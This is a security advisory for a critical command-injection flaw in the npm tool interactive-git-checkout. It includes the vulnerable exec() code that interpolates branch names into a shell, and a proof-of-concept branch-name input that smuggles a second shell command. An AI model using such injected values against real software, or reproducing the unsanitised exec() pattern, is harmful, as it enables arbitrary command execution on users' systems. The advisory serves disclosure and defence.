# [C] interactive-git-checkout has a Command Injection vulnerability

## Summary
Severity: Critical
Advisory: GHSA-4wcm-7hjf-6xw5
CVE: CVE-2025-59046
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2025-09-10
Source: https://github.com/advisories/GHSA-4wcm-7hjf-6xw5
Type: github-advisory

## Affected
- npm: `interactive-git-checkout` — affected >=0

## Details
The npm package `interactive-git-checkout` is an interactive command-line tool that allows users to checkout a git branch while it prompts for the branch name on the command-line. It is available as an npm package and can be installed via `npm install -g interactive-git-checkout`.

Resources: 
 * Project's npm package: https://www.npmjs.com/package/interactive-git-checkout
 
## Command Injection Vulnerability

The `interactive-git-checkout` tool is vulnerable to a command injection vulnerability because it passes the branch name to the `git checkout` command using the Node.js child process module's `exec()` function without proper input validation or sanitization.

The following vulnerable code snippets demonstrates the issue:

```js
const { exec: execCb } = require('child_process');
const { promisify } = require('util');

const exec = promisify(execCb);

module.exports = async (targetBranch) => {
    const { stdout, stderr } = await exec(`git checkout ${targetBranch}`);
    process.stderr.write(stderr);
    process.stdout.write(stdout);
};
```

## Exploit Proof of Concept

1. Install the `interactive-git-checkout` package (as suggested by the package's README):

```bash
npm install --global interactive-git-checkout
```

2. Run the executable exposed by the installed package:

```bash
$ igc
```

3. When prompted, enter the following branch name:

```bash
hello ; echo 'Command Injection Vulnerability Exploited!' > /tmp/command-injection.txt; #
```

## Vulnerable versions

All versions of interactive-git-checkout are vulnerable to this issue, up to and including to the latest version of `1.1.4`.

# Author

Liran Tal

## References
- https://github.com/ninofiliu/interactive-git-checkout/security/advisories/GHSA-4wcm-7hjf-6xw5
- https://nvd.nist.gov/vuln/detail/CVE-2025-59046
- https://github.com/ninofiliu/interactive-git-checkout/commit/8dd832dd302af287a61611f4f85e157cd1c6bb41
- https://github.com/ninofiliu/interactive-git-checkout
